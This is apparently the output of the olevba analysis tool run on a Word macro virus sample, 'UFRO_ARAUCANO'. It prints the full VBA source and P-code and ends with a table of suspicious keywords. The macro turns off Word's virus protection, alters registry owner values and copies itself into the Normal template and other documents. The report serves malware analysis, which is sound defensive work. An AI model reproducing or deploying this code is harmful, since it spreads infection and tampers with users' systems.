olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ufro
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ufro - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Nombre del virus: UFRO_ARAUCANO
'Origen: Temuco - Chile

Private Sub Document_Close()
On Error GoTo ARAUCANO
Options.VirusProtection = False
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Temuco Virus Ufro"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "UFRO_ARAUCANO"
If Month(Now()) = 10 And Day(Now()) = 10 Then MsgBox "UFRO_ARAUCANO", vbInformation, "INFORMACIÓN!!!"
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "adk-tvu"
    .Execute
Randomize
If Int(3 * Rnd) = 1 Then
   UFRO_ARAUCANO
End If
ARAUCANO:
End With
End Sub
 Private Sub UFRO_ARAUCANO()
If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
        lineofcode = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
        ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines I * 3, lineofcode
     Next I
    ActiveDocument.SaveAs AddToRecentFiles:=False
Else
If Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For I = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
        lineofcode = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
        NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines I * 3, lineofcode
    Next I
    NormalTemplate.Save
End If
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ufro
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3289 bytes
' Line #0:
' 	QuoteRem 0x0000 0x001F "Nombre del virus: UFRO_ARAUCANO"
' Line #1:
' 	QuoteRem 0x0000 0x0016 "Origen: Temuco - Chile"
' Line #2:
' Line #3:
' 	FuncDefn (Private Sub Document_Close())
' Line #4:
' 	OnError ARAUCANO 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	LitStr 0x0011 "Temuco Virus Ufro"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #7:
' 	LitStr 0x000D "UFRO_ARAUCANO"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #8:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "UFRO_ARAUCANO"
' 	Ld vbInformation 
' 	LitStr 0x000E "INFORMACIÓN!!!"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #9:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #10:
' 	LitStr 0x0007 "adk-tvu"
' 	MemStWith Author 
' Line #11:
' 	ArgsMemCallWith Execute 0x0000 
' Line #12:
' 	ArgsCall Read 0x0000 
' Line #13:
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #14:
' 	ArgsCall UFRO_ARAUCANO 0x0000 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Label ARAUCANO 
' Line #17:
' 	EndWith 
' Line #18:
' 	EndSub 
' Line #19:
' 	FuncDefn (Private Sub UFRO_ARAUCANO())
' Line #20:
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #21:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #22:
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lineofcode 
' Line #23:
' 	Ld I 
' 	LitDI2 0x0003 
' 	Mul 
' 	Ld lineofcode 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #24:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #26:
' 	ElseBlock 
' Line #27:
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #29:
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lineofcode 
' Line #30:
' 	Ld I 
' 	LitDI2 0x0003 
' 	Mul 
' 	Ld lineofcode 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #31:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

